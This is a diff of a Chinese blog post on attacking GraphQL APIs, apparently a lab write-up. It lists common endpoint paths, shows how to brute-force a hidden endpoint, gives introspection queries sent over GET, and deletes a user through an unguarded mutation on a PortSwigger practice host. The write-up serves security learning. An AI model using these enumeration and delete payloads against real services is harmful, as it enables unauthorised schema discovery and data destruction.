@@ -1,12 +1,12 @@
 ---
 title: 接口类型&GraphQL语法&内省利用查询&安全漏洞联动&端点结果解析&路径枚举
-published: 2026-09-15 11:39
-description: 还没准备好
+published: 2026-09-29T20:30:00
+description: GraphQL API 攻防，涵盖常见路径、内省与绕过、隐藏端点爆破。通过 GET 参数触发内省枚举类型，并利用 query/mutation 查询和删除用户。最后结合 DVGA 靶场，复现 XSS、RCE、SSRF、任意文件上传等安全联动漏洞
 tags:
   - GraphQL
   - API安全
 category: 网络安全
-draft: true
+draft: false
 ---
 
 # 知识点
@@ -18,6 +18,7 @@ draft: true
 ## 常见的GraphQL路径
 
 ```
+/api
 /graphql
 /graphql-console
 /graphql-devtools
@@ -89,25 +90,143 @@ GET /api?query=%7b__schema%0a+++++%7bqueryType%7bname%7d%7d%7d
 introspection Payload(Enumerate Database Schema via Introspection)
 ```
 
-导入解析JSON找端点和参数
+# 实验室：查找隐藏的 GraphQL 端点
+
+该靶场和之前的不同，如题目，是隐藏的（**抓包是发现GraphQL接口的重要手段，但在某些情况下可能无法发现，此时需要主动探测**），因此需要爆破找到端点，字典使用文章开头部分的（注意将反斜杠去除）
 
 ```
-GET /api?query=mutation+deleteOrganizationUser+%7b%0d%0a++++deleteOrganizationUser%28input%3a+%7bid%3a3%7d%29+%7b%0d%0a++++++++user+%7b%0d%0a++++++++++++id%0d%0a++++++++++++username%0d%0a++++++++%7d%0d%0a++++%7d%0d%0a%7d
+GET /$x$ HTTP/1.1
+Host: 0a7d00b7033c36ec81e86b69008000ce.web-security-academy.net
+Referer: https://portswigger.net/
+```
 
+状态码为400，url为`api`
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 19
+
+"Query not present"
+```
+
+官方文档：http://graphql.cn/learn/introspection/，在内省部分
+
+```
+{
+  __schema {
+    types {
+      name
+    }
+  }
+}
+```
+
+在api的数据包中以POST方式提交，发现方法不被允许，只能使用GET方法
+
+项目：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection，在`Identify An Injection Point`中，有get方式的验证注入点方法
+
+```
+GET /api?query= HTTP/2
+Host: 0a7d00b7033c36ec81e86b69008000ce.web-security-academy.net
+
+// 当在url中拼接?query=时，burp的插件就会识别并变为可使用的方式
+// 在GraphQL插件中：
+{
+  __schema
+      {
+    types {
+      name
+    }
+  }
+}
+```
+
+返回了一些**GraphQL 类型（type）的名称列表**
+
+```
+{
+  "data": {
+    "__schema": {
+      "types": [
+        {
+          "name": "Boolean"
+        },
+        {
+          "name": "DeleteOrganizationUserInput"
+        },
+        {
+          "name": "DeleteOrganizationUserResponse"
+        },
+        {
+          "name": "Int"
+        },
+        {
+          "name": "String"
+        },
+        {
+          "name": "User"
+        },
+        {
+          "name": "__Directive"
+        },
+        {
+          "name": "__DirectiveLocation"
+        },
+        {
+          "name": "__EnumValue"
+        },
+        {
+          "name": "__Field"
+        },
+        {
+          "name": "__InputValue"
+        },
+        {
+          "name": "__Schema"
+        },
+        {
+          "name": "__Type"
+        },
+        {
+          "name": "__TypeKind"
+        },
+        {
+          "name": "mutation"
+        },
+        {
+          "name": "query"
+        }
+      ]
+    }
+  }
+}
+```
+
+此时将数据包发送到插件分析会报错，使用项目中提供的payload，将返回的各种名称、描述等等格式化并保存为文件以便于导入插件
+
+其中有获取用户以及删除用户的两个接口，使用获取用户查询到id为3是目标
+
+```
+query getUser {
+    getUser(id: 3) {
+        id
+        username
+    }
+}
+```
+
+此时使用删除用户，完成该靶场
+
+```
 mutation deleteOrganizationUser {
-
-deleteOrganizationUser(input: {id:3}) {
-
-user {
-
-id
-
-username
-
-}
-
-}
-
+    deleteOrganizationUser(input: {id:3}) {
+        user {
+            id
+            username
+        }
+    }
 }
 ```
 
@@ -122,3 +241,9 @@ RCE代码执行
 SSRF请求伪造
 
 任意文件上传
+
+这个需要安装部署，因为服务器问题下载太慢，所以就没部署
+
+以上的漏洞都在该靶场可以复现，同样也是该站点无法通过抓包发现graphql接口，通过爆破路径发现
+
+之后就是在各个功能点抓包使用graphql接口进行测试
